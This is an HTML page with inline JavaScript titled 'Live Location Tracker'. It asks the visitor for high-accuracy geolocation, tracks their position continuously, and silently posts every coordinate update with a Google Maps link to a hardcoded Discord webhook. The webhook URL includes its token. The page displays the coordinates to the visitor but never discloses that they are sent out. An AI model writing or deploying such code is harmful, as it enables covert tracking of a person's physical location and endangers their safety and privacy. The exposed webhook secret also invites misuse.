<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Location Tracker</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <h2>Live Location Tracker</h2>
    <p id="status">Waiting for location access...</p>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            console.log("âœ… Page loaded, checking location permissions...");
            if (!navigator.geolocation) {
        alert("âŒ Geolocation is not supported by this browser.");
        return;
    }
                // **Force browser to show permission prompt immediately**
    navigator.geolocation.getCurrentPosition(
        (position) => {
            console.log("âœ… User granted geolocation access.");
            startTracking(); // Start continuous tracking
        },
        (error) => {
            console.error("ðŸš¨ Geolocation permission denied:", error.message);
            alert("âŒ You need to enable location access for this to work.");
        },
        { enableHighAccuracy: true }
    );


            navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => {
        if (permissionStatus.state === "granted") {
            console.log("âœ… Geolocation already granted, starting tracking...");
            startTracking();
        } else {
            console.warn("âš ï¸ Geolocation permission not granted yet. Waiting for user action...");
        }
    });
            if (!navigator.geolocation) {
                alert("âŒ Geolocation is not supported by this browser.");
                return;
            }

            function sendLocation(latitude, longitude) {
    const payload = {
        content: `ðŸ“ **Live Location Update:**\nðŸŒ **Latitude:** ${latitude}\nðŸ—ºï¸ **Longitude:** ${longitude}\nðŸ”— [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
    };

    fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`ðŸš¨ Webhook failed: ${response.status} ${response.statusText}`);
        }
        console.log("âœ… Location sent successfully!");
    })
    .catch(error => console.error("ðŸš¨ Error sending location:", error));
}

function saveLocationToDB(latitude, longitude) {
    const request = indexedDB.open("LocationDB", 1);

    request.onupgradeneeded = function (event) {
        const db = event.target.result;
        if (!db.objectStoreNames.contains("locations")) {
            db.createObjectStore("locations", { keyPath: "id" });
        }
    };
    request.onsuccess = function (event) {
        const db = event.target.result;

        // Check if the object store exists before starting the transaction
        if (db.objectStoreNames.contains("locations")) {
            const transaction = db.transaction("locations", "readwrite");
            const store = transaction.objectStore("locations");
            store.put({ id: "latest", latitude, longitude });
        } else {
            console.error("Object store 'locations' does not exist.");
        }
    };
        request.onerror = function () {
            console.error("Failed to open IndexedDB.");
        };
    }
    
    function startTracking() {
    console.log("ðŸš€ Starting continuous geolocation tracking...");

    navigator.geolocation.watchPosition(
        (position) => {
            const { latitude, longitude } = position.coords;
            document.getElementById("status").innerText = `ðŸ“ Location: ${latitude}, ${longitude}`;
            sendLocation(latitude, longitude);
            saveLocationToDB(latitude, longitude);
        },
        (error) => console.error("ðŸš¨ Location error:", error.message),
        {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        }
    );
}

         
            // Start tracking when user interacts with the page
    document.addEventListener("click", () => {
        console.log("ðŸ”„ User clicked, requesting location...");
        startTracking();
    }, { once: true });

            // startTracking();
        });

        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("service-worker.js")
                .then((registration) => {
                    console.log("âœ… Service Worker registered:", registration.scope);
                })
                .catch((error) => {
                    console.error("ðŸš¨ Service Worker registration failed:", error);
                });
        }
    </script>
</body>
</html>
